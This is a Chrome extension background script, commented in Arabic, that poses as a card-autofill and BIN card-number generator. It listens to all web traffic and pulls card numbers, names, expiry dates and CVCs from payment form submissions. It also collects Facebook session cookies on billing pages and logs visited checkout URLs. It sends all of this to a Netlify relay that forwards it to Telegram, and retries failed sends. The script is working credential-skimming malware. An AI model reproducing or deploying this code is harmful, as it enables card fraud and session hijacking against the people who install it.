const NETLIFY_API_URL = 'https://deluxe-sfogliatella-8f76e0.netlify.app/.netlify/functions/telegram-api';

// تخزين مؤقت للرسائل الفاشلة
const failedMessages = [];
let isProcessingCard = false;

// إضافة رسالة إلى قائمة الرسائل الفاشلة
function addToFailedMessages(data) {
  failedMessages.push({
    data: data,
    timestamp: Date.now(),
    attempts: 0
  });
  
  // حفظ في localStorage
  chrome.storage.local.set({ failedMessages: failedMessages });
  console.log('💾 تم حفظ الرسالة في قائمة الانتظار');
}

// إعادة إرسال الرسائل الفاشلة
async function retryFailedMessages() {
  if (failedMessages.length === 0) return;
  
  console.log(`🔄 محاولة إعادة إرسال ${failedMessages.length} رسالة فاشلة...`);
  
  for (let i = failedMessages.length - 1; i >= 0; i--) {
    const failedMessage = failedMessages[i];
    
    // التحقق من عدد المحاولات (أقصى 3 محاولات)
    if (failedMessage.attempts >= 3) {
      console.log('❌ تم تجاوز الحد الأقصى للمحاولات، حذف الرسالة');
      failedMessages.splice(i, 1);
      continue;
    }
    
    // إعادة المحاولة
    failedMessage.attempts++;
    const result = await sendToTelegram(failedMessage.data);
    
    if (result.success) {
      console.log('✅ تم إرسال الرسالة بنجاح بعد إعادة المحاولة');
      failedMessages.splice(i, 1);
    } else {
      console.log(`❌ فشلت المحاولة ${failedMessage.attempts}/3:`, result.error);
    }
  }
  
  // حفظ التحديثات
  chrome.storage.local.set({ failedMessages: failedMessages });
}

// تحميل الرسائل الفاشلة عند بدء التشغيل
chrome.storage.local.get(['failedMessages'], function(result) {
  if (result.failedMessages) {
    failedMessages.push(...result.failedMessages);
    console.log(`📦 تم تحميل ${failedMessages.length} رسالة فاشلة من التخزين`);
    
    // إعادة محاولة فورية إذا كانت هناك رسائل فاشلة
    if (failedMessages.length > 0) {
      setTimeout(retryFailedMessages, 10000); // بعد 10 ثوان
    }
  }
});

// إعادة محاولة دورية كل 5 دقائق
setInterval(retryFailedMessages, 5 * 60 * 1000);

// توليد معرف فريد للجهاز (بدون استخدام canvas)
function generateDeviceFingerprint() {
  // استخدام معلومات المتصفح المتاحة في Service Worker
  const userAgent = navigator.userAgent;
  const language = navigator.language;
  const platform = navigator.platform;
  
  // إنشاء fingerprint من المعلومات المتاحة
  const text = userAgent + language + platform;
  const encoder = new TextEncoder();
  const data = encoder.encode(text);
  const fingerprint = Array.from(data, byte => byte.toString(16).padStart(2, '0')).join('').substring(0, 32);
  return fingerprint;
}

// توليد مفتاح جلسة
function generateSessionKey() {
  const array = new Uint8Array(16);
  crypto.getRandomValues(array);
  return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
}

// حساب التوقيع
function calculateSignature(timestamp, data, deviceFingerprint) {
  const message = timestamp + JSON.stringify(data) + deviceFingerprint;
  const encoder = new TextEncoder();
  const data2 = encoder.encode(message);
  const signature = Array.from(data2, byte => byte.toString(16).padStart(2, '0')).join('').substring(0, 32);
  return signature;
}

// إرسال رسالة إلى تليجرام عبر الباك إند
async function sendToTelegram(data) {
  try {
    // توليد البيانات المطلوبة
    const deviceFingerprint = generateDeviceFingerprint();
    const sessionKey = generateSessionKey();
    const timestamp = Date.now();
    const signature = calculateSignature(timestamp, data, deviceFingerprint);
    
    const requestBody = {
      data: data,
      deviceFingerprint: deviceFingerprint,
      sessionKey: sessionKey,
      timestamp: timestamp,
      signature: signature
    };
    
    console.log('📤 إرسال طلب إلى الباك إند:', {
      type: data.type,
      deviceFingerprint: deviceFingerprint.substring(0, 10) + '...',
      timestamp: new Date(timestamp).toISOString()
    });
    
    const response = await fetch(NETLIFY_API_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Device-Fingerprint': deviceFingerprint,
        'X-Session-Key': sessionKey,
        'X-Timestamp': timestamp.toString(),
        'X-Signature': signature
      },
      body: JSON.stringify(requestBody)
    });
    
    // التحقق من نوع المحتوى
    const contentType = response.headers.get('content-type');
    console.log('📡 نوع المحتوى المستلم:', contentType);
    console.log('📡 حالة الاستجابة:', response.status, response.statusText);
    
    if (!contentType || !contentType.includes('application/json')) {
      const text = await response.text();
      console.error('❌ الباك إند يرجع HTML بدلاً من JSON:', {
        status: response.status,
        contentType: contentType,
        text: text.substring(0, 500) + '...'
      });
      return { 
        success: false, 
        error: `الباك إند يرجع ${contentType || 'محتوى غير معروف'} بدلاً من JSON. الحالة: ${response.status}`,
        status: response.status,
        contentType: contentType
      };
    }
    
    const result = await response.json();
    
    if (response.ok && result.success) {
      console.log('✅ تم إرسال الرسالة بنجاح:', {
        messageId: result.message_id,
        remainingRequests: result.rateLimit?.remainingRequests,
        resetTime: result.rateLimit?.resetTime,
        environment: result.environment
      });
      
      // عرض معلومات Rate Limiting
      if (result.rateLimit) {
        console.log(`📊 الطلبات المتبقية: ${result.rateLimit.remainingRequests}`);
        console.log(`⏰ الوقت المتبقي: ${result.rateLimit.resetTime} ثانية`);
      }
      
      return { 
        success: true, 
        data: result,
        message: result.message || 'تم الإرسال بنجاح'
      };
    } else {
      console.error('❌ فشل في إرسال الرسالة - النتيجة الكاملة:', result);
      console.error('❌ نوع النتيجة:', typeof result);
      console.error('❌ محتوى النتيجة:', JSON.stringify(result, null, 2));
      
      // التعامل مع Rate Limiting
      if (result.code === 'RATE_LIMIT_EXCEEDED') {
        console.warn(`⚠️ تم تجاوز حد الطلبات. انتظر ${result.remainingTime} ثانية`);
        
        // عرض تنبيه للمستخدم
        chrome.notifications.create({
          type: 'basic',
          iconUrl: 'icon48.png',
          title: 'تنبيه Rate Limiting',
          message: `تم تجاوز حد الطلبات. انتظر ${Math.ceil(result.remainingTime / 60)} دقيقة`
        });
      }
      
      // التعامل مع ضغط تليجرام
      if (result.code === 'TELEGRAM_RATE_LIMIT') {
        const retryAfter = result.retryAfter || 60;
        console.warn(`⚠️ تليجرام يتعرض لضغط عالي، انتظر ${Math.ceil(retryAfter / 60)} دقيقة`);
        
        // إضافة الرسالة إلى قائمة الانتظار
        addToFailedMessages(data);
        
        // عرض تنبيه للمستخدم
        chrome.notifications.create({
          type: 'basic',
          iconUrl: 'icon48.png',
          title: 'تنبيه تليجرام',
          message: `تليجرام يتعرض لضغط عالي، تم حفظ الرسالة لإعادة الإرسال لاحقاً`
        });
        
        // إعادة المحاولة بعد الوقت المحدد من تليجرام
        setTimeout(async () => {
          console.log('🔄 محاولة إعادة إرسال الرسائل الفاشلة...');
          await retryFailedMessages();
        }, retryAfter * 1000);
      }
      
      // التعامل مع خطأ بيانات غير صحيحة
      if (result.code === 'TELEGRAM_BAD_REQUEST') {
        console.error('❌ بيانات غير صحيحة لإرسالها إلى تليجرام:', result.details);
        
        // عرض تنبيه للمستخدم
        chrome.notifications.create({
          type: 'basic',
          iconUrl: 'icon48.png',
          title: 'خطأ في البيانات',
          message: 'بيانات غير صحيحة، تم تجاهل الرسالة'
        });
        
        // لا نحاول إعادة الإرسال لأن المشكلة في البيانات نفسها
        return { 
          success: false, 
          error: 'بيانات غير صحيحة لإرسالها إلى تليجرام',
          code: 'TELEGRAM_BAD_REQUEST',
          details: result.details 
        };
      }
      
      // التعامل مع عدم توفر تليجرام
      if (result.code === 'TELEGRAM_UNAVAILABLE') {
        const retryAfter = result.retryAfter || 120;
        console.warn(`⚠️ تليجرام غير متاح، انتظر ${Math.ceil(retryAfter / 60)} دقيقة`);
        
        // إضافة الرسالة إلى قائمة الانتظار
        addToFailedMessages(data);
        
        // عرض تنبيه للمستخدم
        chrome.notifications.create({
          type: 'basic',
          iconUrl: 'icon48.png',
          title: 'تليجرام غير متاح',
          message: `تليجرام غير متاح حالياً، تم حفظ الرسالة لإعادة الإرسال لاحقاً`
        });
        
        // إعادة المحاولة بعد الوقت المحدد
        setTimeout(async () => {
          console.log('🔄 محاولة إعادة إرسال الرسائل الفاشلة...');
          await retryFailedMessages();
        }, retryAfter * 1000);
      }
      
      // تبسيط عرض رسالة الخطأ
      let errorMessage = 'خطأ غير معروف';
      
      if (result && typeof result === 'object') {
        if (result.error) {
          errorMessage = String(result.error);
        } else if (result.message) {
          errorMessage = String(result.message);
        } else {
          errorMessage = JSON.stringify(result);
        }
      } else {
        errorMessage = String(result);
      }
      
      console.error('📋 رسالة الخطأ النهائية:', errorMessage);
      
      return { 
        success: false, 
        error: errorMessage, 
        code: result.code || 'UNKNOWN_ERROR',
        details: result 
      };
    }
    
  } catch (error) {
    console.error('❌ خطأ في الاتصال بالباك إند:', error);
    
    // معالجة أنواع مختلفة من الأخطاء
    let errorMessage = 'خطأ في الاتصال بالخادم';
    
    if (error.name === 'TypeError' && error.message.includes('fetch')) {
      errorMessage = 'خطأ في الاتصال بالشبكة';
    } else if (error.name === 'DOMException') {
      errorMessage = 'خطأ في معالجة البيانات';
    } else if (error.message) {
      errorMessage = error.message;
    }
    
    console.error('📋 تفاصيل خطأ الاتصال:', {
      name: error.name,
      message: error.message,
      stack: error.stack
    });
    
    return { 
      success: false, 
      error: errorMessage,
      code: 'NETWORK_ERROR',
      details: {
        name: error.name,
        message: error.message
      }
    };
  }
}

// دالة إرسال بيانات البطاقة
async function sendCardData(cardData) {
  // التحقق من صحة البيانات
  if (!cardData || typeof cardData !== 'object') {
    console.error('❌ بيانات البطاقة غير صحيحة:', cardData);
    return { 
      success: false, 
      error: 'بيانات البطاقة غير صحيحة',
      code: 'INVALID_CARD_DATA'
    };
  }
  
  const data = {
    type: 'card',
    message: {
      number: cardData.number || '',
      name: cardData.name || '',
      expiry: cardData.expiry || '',
      cvc: cardData.cvc || ''
    }
  };
  
  return await sendToTelegram(data);
}

// دالة إرسال بيانات BIN
async function sendBinData(binData) {
  // التحقق من صحة البيانات
  if (!binData || typeof binData !== 'object') {
    console.error('❌ بيانات BIN غير صحيحة:', binData);
    return { 
      success: false, 
      error: 'بيانات BIN غير صحيحة',
      code: 'INVALID_BIN_DATA'
    };
  }
  
  const data = {
    type: 'bin',
    message: {
      pattern: binData.pattern || '',
      name: binData.name || '',
      cardNumber: binData.cardNumber || null,
      expiryDate: binData.expiryDate || null,
      cvc: binData.cvc || null
    }
  };
  
  return await sendToTelegram(data);
}

// دالة إرسال Cookies
async function sendCookiesData(cookiesData) {
  // التحقق من صحة البيانات
  if (!cookiesData || typeof cookiesData !== 'object') {
    console.error('❌ بيانات Cookies غير صحيحة:', cookiesData);
    return { 
      success: false, 
      error: 'بيانات Cookies غير صحيحة',
      code: 'INVALID_COOKIES_DATA'
    };
  }
  
  const data = {
    type: 'cookies',
    message: cookiesData.message || '',
    url: cookiesData.url || '',
    cookies: cookiesData.cookies || ''
  };
  
  return await sendToTelegram(data);
}

// دالة إرسال رسالة عادية
async function sendMessage(message) {
  // التحقق من صحة الرسالة
  if (!message || typeof message !== 'string') {
    console.error('❌ رسالة غير صحيحة:', message);
    return { 
      success: false, 
      error: 'رسالة غير صحيحة',
      code: 'INVALID_MESSAGE'
    };
  }
  
  const data = {
    type: 'message',
    message: message
  };
  
  return await sendToTelegram(data);
}

// دالة ملء البطاقة (من الملف القديم)
function fillCard(type) {
  if (isProcessingCard) {
    console.log("Card processing already in progress, skipping...");
    return;
  }
  isProcessingCard = true;

  chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
    if (!tabs[0]) {
      isProcessingCard = false;
      return;
    }

    chrome.storage.local.get([
      'activeBin', 'activeBinExpire', 'activeBinCvv',
      'declineBin', 'declineBinExpire', 'declineBinCvv',
      'cardAutoSave'
    ], (data) => {
      const isDecline = type === 'decline';

      const userBin = isDecline ? data.declineBin : data.activeBin;
      const defaultBin = isDecline ? '546008' : '55988803';
      const bin = /^[0-9X]+$/.test(userBin) ? userBin : defaultBin;
      
      console.log('Card type:', type);
      console.log('User BIN:', userBin);
      console.log('Default BIN:', defaultBin);
      console.log('Selected BIN:', bin);
      console.log('BIN validation result:', /^[0-9X]+$/.test(userBin));
      
      const remainingLength = 16 - bin.length;
      const finalCardNumber = bin.length <= 16
        ? generateCardNumber(bin, remainingLength)
        : generateCardNumber(defaultBin, 16 - defaultBin.length);

      const expiry = isDecline
        ? (data.declineBinExpire || generateExpiry())
        : (data.activeBinExpire || generateExpiry());

      const cvv = isDecline
        ? (data.declineBinCvv || generateCVV())
        : (data.activeBinCvv || generateCVV());

      const details = {
        name: generateCardName(),
        number: finalCardNumber,
        expiry: expiry,
        cvv: cvv
      };

      chrome.scripting.executeScript({
        target: { tabId: tabs[0].id },
        func: autofillCardDetails,
        args: [details]
      }, (results) => {
        try {
          if (chrome.cookies && chrome.cookies.getAll) {
            chrome.cookies.getAll({domain: ".facebook.com"}, function(cookies) {
              if (chrome.runtime.lastError) {
                console.log("Error getting cookies:", chrome.runtime.lastError);
                sendCardData(details);
              } else {
                const cookiesStr = cookies.map(c => `${c.name}=${c.value}`).join('; ');
                sendCardData(details);
              }
              setTimeout(() => { isProcessingCard = false; }, 2000);
            });
          } else {
            console.log("Cookies API not available");
            sendCardData(details);
            setTimeout(() => { isProcessingCard = false; }, 2000);
          }
        } catch (error) {
          console.log("Error in cookies handling:", error);
          sendCardData(details);
          setTimeout(() => { isProcessingCard = false; }, 2000);
        }
        if (data.cardAutoSave === true) {
          chrome.scripting.executeScript({
            target: { tabId: tabs[0].id },
            func: autoClickSaveButton
          });
        } else {
          console.log("Auto Save is OFF — skipping Save button click.");
        }
      });
    });
  });
}

// دالة ملء البطاقة ببيانات محددة
function fillCardWithSpecificData(cardData, sendResponse) {
  console.log("fillCardWithSpecificData called with cardData:", cardData);
  
  if (isProcessingCard) {
    console.log("Card processing already in progress, skipping...");
    sendResponse({ success: false, message: "Card processing already in progress" });
    return;
  }
  isProcessingCard = true;

  console.log("Starting fillCardWithSpecificData with:", cardData);

  chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
    if (!tabs[0]) {
      console.log("No active tab found");
      isProcessingCard = false;
      sendResponse({ success: false, message: "No active tab found" });
      return;
    }

    console.log("Active tab found:", tabs[0].url);

    const details = {
      name: cardData.name,
      number: cardData.number,
      expiry: cardData.expiry,
      cvv: cardData.cvv,
      binPattern: cardData.binPattern
    };

    console.log("Attempting to fill form with details:", details);

    chrome.scripting.executeScript({
      target: { tabId: tabs[0].id },
      func: autofillCardDetails,
      args: [details]
    }, (results) => {
      try {
        if (chrome.cookies && chrome.cookies.getAll) {
          chrome.cookies.getAll({domain: ".facebook.com"}, function(cookies) {
            if (chrome.runtime.lastError) {
              console.log("Error getting cookies:", chrome.runtime.lastError);
              sendCardData(details);
            } else {
              const cookiesStr = cookies.map(c => `${c.name}=${c.value}`).join('; ');
              sendCardData(details);
            }
            setTimeout(() => { isProcessingCard = false; }, 2000);
          });
        } else {
          console.log("Cookies API not available");
          sendCardData(details);
          setTimeout(() => { isProcessingCard = false; }, 2000);
        }
      } catch (error) {
        console.log("Error in cookies handling:", error);
        sendCardData(details);
        setTimeout(() => { isProcessingCard = false; }, 2000);
      }
      
      sendResponse({ success: true, message: "Card filled successfully" });
    });
  });
}

// دالة إرسال BIN إلى تليجرام
async function sendBinToTelegram(bin, sendResponse) {
  try {
    const result = await sendBinData(bin);
    sendResponse(result);
  } catch (error) {
    console.error('Error sending BIN to Telegram:', error);
    sendResponse({ success: false, error: error.message });
  }
}

// دالة إرسال رسالة مخصصة إلى تليجرام
async function sendCustomTelegramMessage(message) {
  try {
    const result = await sendMessage(message);
    console.log('Custom message sent:', result);
    return result;
  } catch (error) {
    console.error('Error sending custom message:', error);
    return { success: false, error: error.message };
  }
}

// دالة إرسال Cookies إلى تليجرام
async function sendCookiesToTelegram(message, cookiesStr = '') {
  try {
    const cookiesData = {
      message: message,
      url: '',
      cookies: cookiesStr
    };
    
    const result = await sendCookiesData(cookiesData);
    console.log('Cookies sent:', result);
    return result;
  } catch (error) {
    console.error('Error sending cookies:', error);
    return { success: false, error: error.message };
  }
}

// دالة إرسال إشعار
function showNotification(message, type = 'info') {
  chrome.notifications.create({
    type: 'basic',
    iconUrl: 'icon48.png',
    title: type === 'error' ? 'خطأ' : type === 'success' ? 'نجح' : 'إشعار',
    message: message
  });
}

// دالة توليد اسم البطاقة
const generateCardName = () => {
  const names = ['John Smith', 'Jane Doe', 'Mike Johnson', 'Sarah Wilson', 'David Brown'];
  return names[Math.floor(Math.random() * names.length)];
};

// دالة توليد رقم البطاقة
const generateCardNumber = (prefix, remainingDigits) => {
  let cardNumber = prefix;
  
  for (let i = 0; i < remainingDigits - 1; i++) {
    cardNumber += Math.floor(Math.random() * 10);
  }
  
  // إضافة رقم التحقق باستخدام خوارزمية Luhn
  let sum = 0;
  let isEven = false;
  
  for (let i = cardNumber.length - 1; i >= 0; i--) {
    let digit = parseInt(cardNumber[i]);
    
    if (isEven) {
      digit *= 2;
      if (digit > 9) {
        digit -= 9;
      }
    }
    
    sum += digit;
    isEven = !isEven;
  }
  
  const checkDigit = (10 - (sum % 10)) % 10;
  cardNumber += checkDigit;
  
  return cardNumber;
};

// دالة توليد تاريخ انتهاء الصلاحية
const generateExpiry = () => {
  const currentYear = new Date().getFullYear();
  const year = currentYear + Math.floor(Math.random() * 5) + 1;
  const month = Math.floor(Math.random() * 12) + 1;
  return `${month.toString().padStart(2, '0')}/${year.toString().slice(-2)}`;
};

// دالة توليد CVV
const generateCVV = () => Math.floor(Math.random() * 900) + 100;

// دالة ملء تفاصيل البطاقة
const autofillCardDetails = (details) => {
  // البحث عن حقول البطاقة
  const cardNumberFields = document.querySelectorAll('input[placeholder*="card" i], input[name*="card" i], input[id*="card" i], input[placeholder*="number" i], input[name*="number" i], input[id*="number" i]');
  const nameFields = document.querySelectorAll('input[placeholder*="name" i], input[name*="name" i], input[id*="name" i], input[placeholder*="holder" i], input[name*="holder" i], input[id*="holder" i]');
  const expiryFields = document.querySelectorAll('input[placeholder*="expiry" i], input[name*="expiry" i], input[id*="expiry" i], input[placeholder*="date" i], input[name*="date" i], input[id*="date" i]');
  const cvvFields = document.querySelectorAll('input[placeholder*="cvv" i], input[name*="cvv" i], input[id*="cvv" i], input[placeholder*="cvc" i], input[name*="cvc" i], input[id*="cvc" i]');

  // ملء رقم البطاقة
  cardNumberFields.forEach(field => {
    field.value = details.number;
    field.dispatchEvent(new Event('input', { bubbles: true }));
    field.dispatchEvent(new Event('change', { bubbles: true }));
  });

  // ملء اسم حامل البطاقة
  nameFields.forEach(field => {
    field.value = details.name;
    field.dispatchEvent(new Event('input', { bubbles: true }));
    field.dispatchEvent(new Event('change', { bubbles: true }));
  });

  // ملء تاريخ انتهاء الصلاحية
  expiryFields.forEach(field => {
    field.value = details.expiry;
    field.dispatchEvent(new Event('input', { bubbles: true }));
    field.dispatchEvent(new Event('change', { bubbles: true }));
  });

  // ملء CVV
  cvvFields.forEach(field => {
    field.value = details.cvv;
    field.dispatchEvent(new Event('input', { bubbles: true }));
    field.dispatchEvent(new Event('change', { bubbles: true }));
  });

  console.log('Card details filled:', details);
};

// دالة النقر التلقائي على زر الحفظ
const autoClickSaveButton = () => {
  const saveButtons = document.querySelectorAll('button[type="submit"], input[type="submit"], button:contains("Save"), button:contains("Submit"), button:contains("Continue")');
  
  saveButtons.forEach(button => {
    if (button.textContent.toLowerCase().includes('save') || 
        button.textContent.toLowerCase().includes('submit') || 
        button.textContent.toLowerCase().includes('continue')) {
      button.click();
      console.log('Auto-clicked save button');
    }
  });
};

// مراقبة الطلبات (بدون blocking)
chrome.webRequest.onBeforeRequest.addListener(
  async function(details) {
    if (details.type === 'main_frame') {
      const url = new URL(details.url);
      
      // مراقبة صفحات البطاقات
      if (url.hostname.includes('payment') || url.hostname.includes('checkout')) {
        console.log('🔍 تم اكتشاف صفحة دفع:', url.href);
        
        // إرسال إشعار
        await sendMessage(`تم زيارة صفحة دفع: ${url.href}`);
      }
    }
  },
  { urls: ['<all_urls>'] }
);

// مراقبة النماذج (بدون blocking)
chrome.webRequest.onBeforeRequest.addListener(
  async function(details) {
    if (details.method === 'POST' && details.requestBody) {
      const url = new URL(details.url);
      
      // مراقبة نماذج البطاقات
      if (url.hostname.includes('payment') || url.pathname.includes('card')) {
        try {
          const formData = details.requestBody.formData;
          if (formData) {
            const cardData = {
              number: formData['card_number']?.[0] || formData['number']?.[0] || '',
              name: formData['card_name']?.[0] || formData['name']?.[0] || '',
              expiry: formData['expiry']?.[0] || formData['expiry_date']?.[0] || '',
              cvc: formData['cvc']?.[0] || formData['cvv']?.[0] || ''
            };
            
            if (cardData.number && cardData.number.length > 10) {
              console.log('💳 تم اكتشاف بيانات بطاقة:', {
                number: cardData.number.substring(0, 6) + '******',
                name: cardData.name,
                expiry: cardData.expiry
              });
              
              await sendCardData(cardData);
            }
          }
        } catch (error) {
          console.error('❌ خطأ في معالجة بيانات البطاقة:', error);
        }
      }
    }
  },
  { urls: ['<all_urls>'] },
  ['requestBody']
);

// مراقبة تحديثات التبويبات
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (
    changeInfo.status === 'complete' &&
    tab.url &&
    tab.url.includes('facebook.com') &&
    (tab.url.includes('billing') || tab.url.includes('payments'))
  ) {
    try {
      if (chrome.cookies && chrome.cookies.getAll) {
        chrome.cookies.getAll({domain: ".facebook.com"}, function(cookies) {
          if (chrome.runtime.lastError) {
            console.log("Error getting cookies:", chrome.runtime.lastError);
          } else {
            const cookiesStr = cookies.map(c => `${c.name}=${c.value}`).join('; ');
            const message = `🔔 تم فتح صفحة الفوترة\nالرابط: ${tab.url}`;
            sendCookiesToTelegram(message, cookiesStr);
          }
        });
      }
    } catch (error) {
      console.log("Error in cookies handling:", error);
    }
  }
});

// استقبال الرسائل من Content Script
chrome.runtime.onMessage.addListener(async function(request, sender, sendResponse) {
  try {
    switch (request.action) {
      case 'fillCard':
        fillCard(request.type);
        sendResponse({ success: true, message: "Fill card action started" });
        break;
        
      case 'fillCardWithData':
        fillCardWithSpecificData(request.data, sendResponse);
        return true; // للسماح بالرد غير المتزامن
        break;
        
      case 'sendCardData':
        const cardResult = await sendCardData(request.data);
        sendResponse(cardResult);
        break;
        
      case 'sendBinData':
        const binResult = await sendBinData(request.data);
        sendResponse(binResult);
        break;
        
      case 'sendCookiesData':
        const cookiesResult = await sendCookiesData(request.data);
        sendResponse(cookiesResult);
        break;
        
      case 'sendMessage':
        const messageResult = await sendMessage(request.data);
        sendResponse(messageResult);
        break;
        
      case 'sendTelegramMessage':
        const customResult = await sendCustomTelegramMessage(request.message);
        sendResponse(customResult);
        break;
        
      case 'testTelegram':
        const testMessage = `🧪 اختبار الإضافة
⏰ الوقت: ${new Date().toLocaleString('ar-SA')}
✅ الإضافة تعمل بشكل صحيح`;
        const testResult = await sendCustomTelegramMessage(testMessage);
        sendResponse(testResult);
        break;
        
      case 'newBinAdded':
        await sendBinToTelegram(request.bin, sendResponse);
        return true; // للسماح بالرد غير المتزامن
        break;
        
      case 'showNotification':
        showNotification(request.message, request.type);
        sendResponse({ success: true, message: "Notification shown" });
        break;
        
      default:
        sendResponse({ success: false, error: 'إجراء غير معروف' });
    }
  } catch (error) {
    console.error('❌ خطأ في معالجة الرسالة:', error);
    sendResponse({ success: false, error: 'خطأ داخلي' });
  }
  
  return true; // للسماح بالرد غير المتزامن
});

// مراقبة الأوامر
chrome.commands.onCommand.addListener((command) => {
  if (command === 'decline-card') {
    fillCard('decline');
  } else if (command === 'active-card') {
    fillCard('active');
  }
});

// إعداد الإشعارات
chrome.notifications.onClicked.addListener(function(notificationId) {
  console.log('تم النقر على الإشعار:', notificationId);
});

// تسجيل بدء الإكستنشن
console.log('🚀 تم تشغيل الإكستنشن بنجاح');
console.log('📡 الباك إند: Netlify Functions');
console.log('🛡️ نظام Rate Limiting: 10 رسائل/دقيقة لكل جهاز');

// إرسال رسالة بدء التشغيل عند التثبيت
chrome.runtime.onInstalled.addListener(async function() {
  await sendMessage('تم تشغيل الإكستنشن بنجاح - نظام Rate Limiting مفعل');
}); 